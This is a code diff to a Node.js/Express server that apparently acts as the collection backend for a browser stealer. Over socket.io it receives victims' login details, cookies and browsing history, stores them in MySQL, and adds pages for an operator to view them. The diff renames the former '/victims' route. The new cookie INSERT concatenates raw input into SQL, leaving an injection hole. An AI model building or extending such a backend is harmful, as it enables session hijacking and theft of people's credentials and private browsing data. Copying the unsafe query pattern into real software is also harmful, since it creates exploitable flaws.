@@ -85,12 +85,22 @@ app.get('/logout',
     res.redirect('/');
   });
 
-app.get('/victims',
+app.get('/cookies',
+  require('connect-ensure-login').ensureLoggedIn(),
+  function(req, res){
+    con.query("SELECT * FROM Cookie", function (err, result, fields) {
+      if (err) throw err;
+      res.render('cookies', { user: req.user, rowData: result });
+    });
+
+  });
+
+app.get('/history',
   require('connect-ensure-login').ensureLoggedIn(),
   function(req, res){
     con.query("SELECT * FROM History", function (err, result, fields) {
       if (err) throw err;
-      res.render('victims', { user: req.user, rowData: result });
+      res.render('history', { user: req.user, rowData: result });
     });
 
   });
@@ -117,9 +127,11 @@ io.on('connection', (socket) => {
     console.log("Login detected: " + loginInfo);
   });
   socket.on('Cookies', (cookies) => {
-    console.log("Cookies");
-    cookies.split(' ').forEach((cookie) => {
-      console.log("    " + cookie);
+    var sql = "INSERT INTO Cookie (userID, details) VALUES (1, '"+ cookies+"')";
+
+    con.query(sql, function (err, result) {
+        if (err) throw err;
+      console.log("1 cookie inserted");
     });
   });
   socket.on('History', (history) => {
@@ -131,7 +143,7 @@ io.on('connection', (socket) => {
 
     con.query(sql, function (err, result) {
         if (err) throw err;
-      console.log("1 record inserted");
+      console.log("1 history log inserted");
     });
     //history.forEach((field) => {
       //console.log("Field: "+typeof(field));
